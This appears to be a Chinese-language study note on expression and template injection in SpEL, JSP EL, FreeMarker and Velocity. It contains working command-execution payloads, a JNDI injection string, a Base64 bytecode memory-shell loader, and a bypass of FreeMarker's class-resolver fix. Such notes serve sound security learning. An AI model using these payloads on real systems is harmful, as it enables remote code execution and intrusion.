
# 表达式注入 模板注入

## SpEL 

- 字面量	`#{'Hello World'}`	字符串、数值、布尔值等
- 引用 Bean	`#{userServiceImpl}`	直接获取 Spring 容器中的 Bean
- 访问属性	`#{user.name}`	访问 user 对象的 name 属性
- 调用方法	`#{user.getName().toUpperCase()}`	支持链式调用方法
- 静态方法/类	`#{T(java.lang.Math).PI}`	使用 T() 访问静态常量或方法
- 运算符	`#{1 + 1} 或 #{user.age > 18}`	支持算术、逻辑、关系运算

### call <init>

java.lang 包下的类（如 String, Integer 等），它们可以直接使用类名，而不需要package

`#{new String('Hello')}`

`#{new com.example.model.User('张三', 25)}`

### use 

> 格式#{} ${}一般为占位符 可以在 #{} 中嵌套 ${}

`new String(T(org.springframework.util.StreamUtils).copyToByteArray(exec.getInputStream())`

`T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})`

`T(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Files").readAllLines(Path)`

`T(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Paths").get("path")`

`#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("calc")')}`

#### jndi注入

`#{T(java.lang.System).setProperty('com.sun.jndi.ldap.object.trustURLCodebase', 'true')}`

`#{new javax.management.remote.rmi.RMIConnector(new javax.management.remote.JMXServiceURL("service:jmx:rmi://127.0.0.1:1389/jndi/ldap://127.0.0.1:1389/Basic/Command/Calc"), new java.util.Hashtable()).connect()}`


## JSP EL
 
`${expression}` 访问属性=间接调用方法:

###  `.` 操作符

访问属性:

- `${user.name} `实际调用 user.getName()  
- `${user.address.city}` 实际调用 user.getAddress().getCity() 

> 点号属性取值相当于执行对象的 getter 方法  等号属性赋值则等同于执行 setter 方法

```jsp
<!-- 访问对象的属性 -->
${user.name}
<!-- 调用方法（实际上是访问JavaBean的getter方法） -->
${user.fullName}  <!-- 实际调用 user.getFullName() -->
<!-- EL 2.2后支持直接调用方法-->
${user.getFullName()}
```

### [] 操作符

支持`.操作符`访问属性之外 表达式的值运行时动态确定 也就是可以参数传递

- `${user["name"]}`  同样调用 user.getName() 
- `${user["address"]["city"]}` 调用 user.getAddress().getCity() 



```jsp
<!-- 访问Map值 -->
${map['key']}

 <!-- 动态访问 user.getFirstName() -->
var propertyName = "firstname";
${user[propertyName]} 

 <!-- EL 2.2后支持调用user.getFirstName() -->
${user['getFirstName']()}

<!-- 访问数组或List -->
${list[5]}
${users[0]['name']}

```

`${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval()}`

利用方括号访问属性机制 修改:

`${''['getClass']()['forName']('javax.script.ScriptEngineManager')['newInstance']()['getEngineByName']('js')['eval']()}`

利用方括号动态解析机制 修改:

`${""[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)}`

### EL表达式 可以访问的上下文 作用域

- pageScope	 	页面作用域属性	pageContext.getAttribute(name, PAGE_SCOPE)
- requestScope		请求作用域属性	request.getAttribute(name)
- sessionScope		会话作用域属性	session.getAttribute(name)
- applicationScope		应用作用域属性	application.getAttribute(name)
- param		请求参数（单个）	request.getParameter(name)
- paramValues	 	请求参数（多个）	request.getParameterValues(name)
- header		HTTP头部（单个）	request.getHeader(name)
- headerValues	 	HTTP头部（多个）	request.getHeaders(name)
- cookie	 	Cookie值	遍历request.getCookies()
- initParam		上下文初始化参数	application.getInitParameter(name)
- pageContext	PageContext	JSP页面上下文	pageContext

## Thymeleaf


## Freemarker 

指令控制模板逻辑 内置函数负责处理具体数据

指令区分核心`<#指令名 ></#指令名>`指令和自定义指令`<@指令名>` 

### 数据定义与赋值：<#assign>

可以在模板内部声明变量:

 `<#assign age = 18, city = "Beijing">`

 
#### 其他指令

- 条件判断：`<#if>`: elseif 和 else
- 循环遍历：`<#list>` : `<#list users as user>`
    - 通过$引用读取`${user_index + 1}: ${user}` _index为默认索引变量
- `<#include>` : 直接把另一个文件的内容拷贝进来
- `<#import>` : 将另一个模板作为命名空间导入，常用于引用宏库（Macro）

### 内置函数

内置函数的语法: `expression?built_in_name[(parameters)]`

### new调用

语法: `"ClassFullName"?new(arguments)`

ClassFullName类必须实现 `TemplateModel` 接口:

`<#assign value="freemarker.template.utility.JythonRuntime"?new()>`
`<@value>import os;os.system("calc")</@value>`

`<#assign value="freemarker.template.utility.Execute"?new()(calc)>`

`<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}`

`${}`表达式内执行:

`${"freemarker.template.utility.Execute"?new()("calc")}`

#### 代码执行内存shell JS引擎加载字节码 

`freemarker.template.utility.ObjectConstructor`调用构造函数

`${"freemarker.template.utility.ObjectConstructor"?new()("javax.script.ScriptEngineManager").getEngineByName("js").eval("")}`

```javascript
var bytecodeBase64 = "Base64_Class_Data";
var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
var clsBase64 = classLoader.loadClass('java.util.Base64');
var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');
var decoder = clsBase64.getMethod('getDecoder').invoke(clsBase64);
classBytes = clsDecoder.getMethod('decode', classLoader.loadClass('java.lang.String')).invoke(decoder, bytecodeBase64);
var theUnsafeMethod = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');
theUnsafeMethod.setAccessible(true);
unsafe = theUnsafeMethod.get(null);
clz = unsafe.defineClass(null, classBytes, 0,classBytes.length, null, null);
clz.newInstance();
```

#### 对于2.3.17版本的修复方案的绕过

启动时设置resolver:`TemplateClassResolver.ALLOWS_NOTHING_RESOLVER` 禁止解析任何class

```java
ConfigurableApplicationContext context =  SpringApplication.run(OrderApplication.class, args);
Configuration configuration = (Configuration) context.getBean("freeMarkerConfiguration");
configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

模板引擎的springMacroRequestContext.webApplicationContext 就能获取到spring的应用程序上下文

通过spring上下文获取到 `freeMarkerConfiguration`的bean，修改`freemarker.core.Configurable#newBuiltinClassResolver`绕过

`${springMacroRequestContext.webApplicationContext.getBean('freeMarkerConfiguration').setNewBuiltinClassResolver(springMacroRequestContext.webApplicationContext.getBean('freeMarkerConfiguration').getDefaultConfiguration().getNewBuiltinClassResolver())}`

`${"freemarker.template.utility.Execute"?new()("calc")}`

#### 版本修复

2.3.17版本增加限制:

- TemplateClassResolver.UNRESTRICTED_RESOLVER (不推荐)：没有任何限制（等同于旧版本，极度危险）

- SAFER_RESOLVER (推荐)：禁止实例化著名的危险类（如 java.lang.Thread 等）
    - `freemarker.template.utility.JythonRuntime`
    - `freemarker.template.utility.Execute`
    - `freemarker.template.utility.ObjectConstructor`

- ALLOWS_NOTHING_RESOLVER：完全禁止使用 ?new

### api

语法: `object?api.someJavaMethod()`

> api_builtin_enabled为true时 开启api函数，在2.3.22版本后默认为false


## Velocity

Velocity 默认支持 `$obj.method()` 和 `$obj.property`

利用:`$obj.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()` 